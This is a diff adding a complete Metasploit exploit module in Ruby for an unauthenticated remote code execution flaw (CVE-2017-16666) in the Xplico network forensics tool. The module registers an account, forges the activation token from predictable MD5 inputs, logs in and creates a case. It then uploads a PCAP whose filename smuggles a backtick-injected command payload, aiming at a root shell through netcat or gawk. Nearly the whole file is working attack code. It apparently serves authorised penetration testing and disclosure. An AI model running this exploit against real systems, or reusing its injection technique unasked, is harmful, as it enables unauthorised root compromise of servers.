@@ -1,0 +1,359 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Xplico Remote Code Execution',
+      'Description'    => %q{
+        This module exploits command injection vulnerability. Unauthenticated users can register a new account and then execute a terminal
+        command under the context of the root user.
+
+        The specific flaw exists within the Xplico, which listens on TCP port 9876 by default. The goal of Xplico is extract from an internet
+        traffic capture the applications data contained. There is a hidden end-point at inside of the Xplico that allow anyone to create
+        a new user. Once the user created through /users/register endpoint, it must be activated via activation e-mail. After the registration Xplico try
+        to send e-mail that contains activation code. Unfortunetly, this e-mail probably not gonna reach to the given e-mail address on most of installation.
+        But it's possible to calculate exactly same token value because of insecure cryptographic random string generator function usage.
+
+        One of the feature of Xplico is related to the parsing PCAP files. Once PCAP file uploaded, Xplico execute an operating system command in order to calculate checksum
+        of the file. Name of the for this operation is direclty taken from user input and then used at inside of the command without proper input validation.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Mehmet Ince <mehmet@mehmetince.net>'  # author & msf module
+        ],
+      'References'      =>
+        [
+          ['CVE', '2017-16666'],
+          ['URL', 'https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/'],
+          ['URL', 'https://www.xplico.org/archives/1538']
+        ],
+      'Privileged'      => true,
+      'Platform'        => ['unix'],
+      'Arch'            => ARCH_CMD,
+      'DefaultOptions'  =>
+        {
+          'RPORT' => 9876
+        },
+      'Payload' =>
+        {
+          'Space'       => 252,
+          'DisableNops' => true,
+          'BadChars' => "\x2f\x22",
+          'Compat' =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic netcat gawk', # other cmd payloads can't fit within 252 space due to badchars.
+            },
+        },
+      'Targets'         => [ ['Automatic', {}] ],
+      'DisclosureDate'  => 'Oct 29 2017',
+      'DefaultTarget'   => 0
+    ))
+
+  end
+
+  def check
+    # There is no exact way to understand validity of vulnerability without registering new user as well as trigger the command injection.
+    # which is not something we want to do for only check..!
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'users', 'register'),
+    )
+    if res && res.code == 302
+      Exploit::CheckCode::Safe
+    else
+      Exploit::CheckCode::Unknown
+    end
+  end
+
+  def initiate_session
+    print_status('Initiating new session on server side')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'users', 'login'),
+    )
+    if res && res.code == 200
+      res.get_cookies
+    else
+      nil
+    end
+
+  end
+
+  def register_user(username, password)
+    # First thing first, we need to get csrf token from registration form.
+    print_status('Registering a new user')
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'users', 'register'),
+      'cookie' => @cookie
+    )
+
+    if res && res.code == 200
+      csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil
+      fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil
+    end
+
+    if csrf_token.nil? || fields.nil?
+      fail_with(Failure::Unknown, 'Unable to extact hidden fields from registration form.')
+    end
+
+    # rand_mail_address sometimes generates buggy email address for this app. So we manually generate email address in here.
+    email = ''
+    email << rand_text_alpha_lower(rand(10)+4)
+    email << '@'
+    email << rand_text_alpha_lower(rand(10)+4)
+    email << '.'
+    email << rand_text_alpha_lower(rand(1)+2)
+
+    # Create user
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'users', 'register'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        '_method' => 'POST',
+        'data[_Token][key]' => csrf_token,
+        'data[User][email]' => email,
+        'data[User][username]' => username,
+        'data[User][password]' => password,
+        'data[_Token][fields]' => fields,
+        'data[_Token][unlocked]' => '',
+      }
+    )
+
+    if res && res.code == 302
+      print_good('New user successfully registered')
+      print_status("Username: #{username}")
+      print_status("Password: #{password}")
+    else
+      fail_with(Failure::Unknown, 'Could not register new user')
+    end
+
+    # Awesome. We have user. We need to activate it manually..!
+    print_status('Calculating em_key code of the user')
+
+    unixtime = Time.parse(res.headers['Date']).to_i
+    password_md5 = Rex::Text.md5(password)
+    em_key = Rex::Text.md5(
+      "#{email}#{password_md5}#{unixtime}"
+    )
+    print_status("Activating user with em_key = #{em_key}")
+
+    # We need to follow redirections. Even if we managed to find em_key.
+    # It will redirect us to the login form. We need to see registration completed on final page.
+    res = send_request_cgi!(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'users', 'registerConfirm', em_key),
+      'cookie' => @cookie
+    )
+
+    if res && res.code == 200 && res.body.include?('Registration Completed.')
+      print_good('User successfully activated')
+    else
+      fail_with(Failure::Unknown, 'Could not activated our user. Target may not be vulnerable.')
+    end
+  end
+
+  def login(username, password)
+    # yet another csrf token gathering.
+    print_status('Authenticating with our activated new user')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'users', 'login'),
+      'cookie' => @cookie
+    )
+
+    if res && res.code == 200
+      csrf_token = res.get_hidden_inputs.first['data[_Token][key]'] || nil
+      fields = res.get_hidden_inputs.first['data[_Token][fields]'] || nil
+    end
+
+    if csrf_token.nil? || fields.nil?
+      fail_with(Failure::Unknown, 'Unable to extact hidden fields from login form.')
+    end
+
+    res = send_request_cgi!(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'users', 'login'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        '_method' => 'POST',
+        'data[_Token][key]' => csrf_token,
+        'data[User][username]' => username,
+        'data[User][password]' => password,
+        'data[_Token][fields]' => fields,
+        'data[_Token][unlocked]' => '',
+      }
+    )
+
+    if res && res.body.include?('<a href="/pols">Cases</a>')
+      print_good('Successfully authenticated')
+    else
+      fail_with(Failure::Unknown, 'Unable to login.')
+    end
+
+  end
+
+  def create_new_case
+    # We logged in. Not we need to create a new xplico case.
+    print_status('Creating new case')
+    pol_name = rand_text_alpha_lower(rand(4)+8)
+    res = send_request_cgi!(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'pols', 'add'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        '_method' => 'POST',
+        'data[Capture][Type]' => 0,
+        'data[Pol][name]' => pol_name,
+        'data[Pol][external_ref]' => '',
+      }
+    )
+
+    if res && res.body.include?('The Case has been created')
+      res.body.scan(/<a href="\/pols\/view\/([0-9]+)">/).flatten[0]
+    else
+      nil
+    end
+  end
+
+  def create_new_sol(pol_id)
+    # Since we xplico case, it's time to create a "session" for this case.
+    print_status('Creating new xplico session for pcap')
+
+    sol_name = rand_text_alpha_lower(rand(4)+8)
+    # sols/add endpoint reads selected case id through session.
+    # So we need to hit that end-point so we can insert pol_id into the current session data.
+    send_request_cgi!(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'pols', 'view', pol_id),
+      'cookie' => @cookie,
+    )
+
+    # Creating new session.
+    res = send_request_cgi!(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'sols', 'add'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        '_method' => 'POST',
+        'data[Sol][name]' => sol_name,
+      }
+    )
+
+    if res && res.body.include?('The Session has been created')
+      res.body.scan(/<a href="\/sols\/view\/([0-9]+)">/).flatten[0]
+    else
+      nil
+    end
+
+  end
+
+  def upload_pcap(sol_id)
+    print_status('Uploading malformed PCAP file')
+    # We are hitting this end-point so we can access sol_id through session on server-side.
+    send_request_cgi!(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),
+      'cookie' => @cookie,
+    )
+
+    # Reading malformed pcap files.
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2017-16666', 'dump.pcap')
+    fd = ::File.open( path, 'rb')
+    pcap = fd.read(fd.stat.size)
+    fd.close
+
+    data = Rex::MIME::Message.new
+    data.add_part('POST', nil, nil, 'form-data; name="_method"')
+    data.add_part(pcap, 'application/octet-stream', nil, "form-data; name=\"data[Sols][File]\"; filename=\"`#{payload.encoded})`\"") # Yes back-tick injection!
+
+    # Uploading PCAP file.
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'sols', 'pcap'),
+      'cookie' => @cookie,
+      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
+      'data'     => data.to_s
+    )
+
+    if res && res.code == 302
+      print_good('PCAP successfully uploaded. Pcap parser is going to start on server side.')
+    end
+
+    # We can not wait all the day long to have session.
+    # So we are checking status of decoding process 5 times with sleep for a 1 second on each loop.
+    is_job_done = nil
+    counter = 0
+    until session_created? || !is_job_done.nil? || counter == 5
+      res = send_request_cgi(
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, 'sols', 'view', sol_id),
+        'cookie' => @cookie,
+      )
+      if res && res.body.include?('File uploaded, wait start decoding...')
+        print_status('Parsing has started. Wait for parser to get the job done...')
+      end
+      if res && res.body.include?('DECODING')
+        print_good('We are at PCAP decoding phase. Little bit more patience...')
+      end
+      # Tbh decoding process is not going to be finished as long as we have msf session.
+      # We are not going to see this case if we are successful exploiting.
+      if res && res.body.include?('DECODING COMPLETED')
+        print_warning('PCAP parsing process has finished. Haven\'t you got your shell ?')
+        is_job_done = 1
+        next
+      end
+      sleep(1)
+      counter += 1
+    end
+
+  end
+
+  def exploit
+
+    if check == Exploit::CheckCode::Safe
+      fail_with(Failure::NotVulnerable, "#{peer} - Target not vulnerable")
+    end
+
+    # We need to access cookie from everywhere. Thus making it global variable.
+    @cookie = initiate_session
+    if @cookie.nil?
+      fail_with(Failure::Unknown, 'Unable to initiate new sessionid on server.')
+    end
+
+    # We only need to access username and password for login func. Let's leave them as a local variables.
+    password = rand_text_alpha(32)
+    username = rand_text_alpha_lower(rand(8)+8)
+    register_user(username, password)
+    login(username, password)
+
+    # We will need to have pol_id for creating new xplico session.
+    pol_id = create_new_case
+    if pol_id.nil?
+      fail_with(Failure::Unknown, 'Unable to create New Case.')
+    end
+    print_good("New Case successfully creted. Our pol_id = #{pol_id}")
+
+    # Create xplico session by using pol_id
+    sol_id = create_new_sol(pol_id)
+    if sol_id.nil?
+      fail_with(Failure::Unknown, 'Unable to create New Sol.')
+    end
+    print_good("New Sols successfully creted. Our sol_id = #{sol_id}")
+
+    # Uploading malformed PCAP file. We are exploiting authenticated cmd inj in here.
+    upload_pcap(sol_id)
+
+  end
+end
